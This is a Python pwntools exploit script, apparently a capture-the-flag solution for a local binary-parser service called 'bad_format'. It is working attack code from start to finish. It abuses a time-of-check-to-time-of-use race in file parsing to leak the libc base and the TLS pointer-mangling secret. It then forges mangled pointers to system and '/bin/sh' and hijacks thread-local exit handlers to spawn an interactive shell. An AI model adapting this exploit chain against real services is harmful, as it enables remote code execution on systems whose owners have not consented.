#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
mmap_libc_diff = 278528
secret = 0

# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
 
# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def ptr_mangle(ptr: int) -> int:
    global secret
    val = ptr ^ secret
    val = rol(val, 0x11, 64)
    return val


def make_dumb_entry() -> bytes:
    v1 = p32(0x8, endian='big')
    v2 = p32(0x0, endian='big')
    return v1 + v2

def make_conditional_64bit_entry() -> bytes:
    v1 = p32(0x0, endian='big')
    v2 = p32(0x0, endian='big')
    return v1 + v2

def gen_dumb_file_data() -> bytes:
    data = make_dumb_entry() * 2
    data += make_conditional_64bit_entry()
    data += make_dumb_entry() * 4
    data += make_conditional_64bit_entry()
    data += make_dumb_entry()
    data += make_conditional_64bit_entry()
    data += make_dumb_entry() * 2
    data += make_conditional_64bit_entry()
    data += make_dumb_entry() * 2
    data += make_conditional_64bit_entry()
    data += make_dumb_entry() * 3
    data += make_conditional_64bit_entry()
    return data

def create_exploit_binary_file(libc_bss) -> bytes:
    data = gen_dumb_file_data()

    _chain = [
        p32(libc_bss & 0xffffffff, endian='big'),
        p32((libc_bss >> 32) & 0xffffffff, endian='big'),
        p32(libc_bss & 0xffffffff, endian='big'),
        p32((libc_bss >> 32) & 0xffffffff, endian='big'),
        p32(libc_bss & 0xffffffff, endian='big'),
        p32((libc_bss >> 32) & 0xffffffff, endian='big'),
    ]
    chain_len = len(b''.join(_chain))

    data += p64(0x0) # skip 8 bytes code
    data += p32(6, endian='big') # sample count
    data += b''.join(_chain) # sample 1

    #mmap_libc_diff = 278528
    data += b'b' * (mmap_libc_diff - len(data) - 10432) # )
    data += b'b' * 164
    data += b'a' * (328-chain_len)
    print("create_exploit_binary_file: " + hex(len(data)))
    return data

def create_setuper_binary_file(system, bin_sh) -> bytes:
    data = gen_dumb_file_data()

    system = ptr_mangle(system)
    _chain = [
        p32(system & 0xffffffff, endian='big'),
        p32((system >> 32) & 0xffffffff, endian='big'),
        p32(bin_sh & 0xffffffff, endian='big'),
        p32((bin_sh >> 32) & 0xffffffff, endian='big'),
        p32(bin_sh & 0xffffffff, endian='big'),
        p32((bin_sh >> 32) & 0xffffffff, endian='big'),
    ]

    chain_len = len(b''.join(_chain))

    data += p64(0x0) # skip 8 bytes code
    data += p32(0x6, endian='big') # sample count
    data += b''.join(_chain) # sample 1

    #mmap_libc_diff = 278528
    libc_rw_offset = 0x204c00 + 168#
    data += b'a' * (mmap_libc_diff - len(data))
    data += b'b' * 164
    data += b'c' * libc_rw_offset
    return data

def create_leaking_binary_file() -> bytes:
    data = gen_dumb_file_data()

    data += p64(0x0) # skip 8 bytes code
    data += p32(0x2, endian='big') # sample count
    data += p32(0x1000, endian='big') + p32(0x0) # sample 1

    #mmap_libc_diff = 278528
    libc_rw_offset = 0x2031c8 # to get heap arena internals
    data += b'a' * (mmap_libc_diff - len(data) + 164) # to start LIBC
    data += b'c' * libc_rw_offset
    return data

def make_toctou_setuper(system, bin_sh):
    #p = process('./bad_format')
    p = remote('127.0.0.1', 17003)
    upload_binary(p, 'kek', create_setuper_binary_file(system, bin_sh))
    p.sendlineafter(b'> ', b'3')
    p.close()

def make_toctou_exploit(libc_bss):
    #p = process('./bad_format')
    p = remote('127.0.0.1', 17003)
    upload_binary(p, 'kek', create_exploit_binary_file(libc_bss))
    p.sendlineafter(b'> ', b'3')
    p.close()

def make_toctou_leaking():
    #p = process('./bad_format')
    p = remote('127.0.0.1', 17003)
    upload_binary(p, 'kek', create_leaking_binary_file())
    p.sendlineafter(b'> ', b'3')
    p.close()


def upload_binary(p, filename: str, data: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', filename.encode()) # filename
    p.sendlineafter(b': ', str(len(data)).encode()) # size
    p.sendafter(b': ', data) # data 

def parse_binary(p, filename: str, toctou: bool = False):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', filename.encode()) # filename
    
    if toctou:
        make_toctou_leaking()
        p.sendlineafter(b': ', b'goida') # output filename
    else:
        p.sendlineafter(b': ', b'goida') # output filename



def main():
    global secret
    #p = process('./bad_format')
    #gdb.attach(p, gdbscript='''b *do_parse+0xb33\nb *__call_tls_dtors\nb *do_parse+0xc1d''')
    p = remote('127.0.0.1', 17003)

    upload_binary(p, 'kek', b'a'*8)
    parse_binary(p, 'kek', toctou=True)

    print(p.recvuntil(b'[!] Sending file data\n'))

    data = p.recvuntil(b'+++ Binary parser +++')

    # try to leak libc base address
    libc_idx = data.index(b'\x7fELF') # libc_based
    libc = data[libc_idx:]
    malloc_ptr = 0x202fd8
    leak = u64(libc[malloc_ptr:malloc_ptr+8])
    
    libc_base = leak - ELF('./libc.so.6').sym['malloc']
    fs_base = libc_base - 10432
    # leak TLS secret to mangle pointers
    secret = u64(data[libc_idx-10432 + 0x30:libc_idx-10432+0x30+8])
    system = libc_base + ELF('./libc.so.6').sym['system']
    bin_sh = libc_base + 0x1cb42f

    print("@ secret: " + hex(secret))
    print("@ libc base: " + hex(libc_base))
    print("@ fs_base: " + hex(fs_base))

    upload_binary(p, 'kek', b'a'*8)

    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', "kek".encode()) # filename
    
    make_toctou_setuper(system, bin_sh)
    p.sendlineafter(b': ', b'goida') # output filename

    p.recvuntil(b'+++ Binary parser +++')

    # write exit handler to .tls 
    upload_binary(p, 'kek', b'a'*8)
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', "kek".encode()) # filename
    
    libc_bss = libc_base + 0x204bec
    make_toctou_exploit(libc_bss)
    
    p.sendlineafter(b': ', b'goida') # output filename

    p.interactive()
    p.close()

if __name__ == '__main__':
    main()